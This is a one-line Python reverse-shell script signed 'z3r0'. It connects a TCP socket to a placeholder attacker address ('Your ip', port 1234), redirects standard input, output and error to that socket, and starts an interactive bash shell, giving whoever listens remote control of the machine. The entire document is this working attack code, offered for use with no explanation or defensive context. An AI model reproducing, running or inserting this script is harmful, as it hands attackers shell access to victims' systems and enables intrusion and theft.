#BY z3r0
import os,socket,subprocess;os.system('clear');s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('Your ip',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])
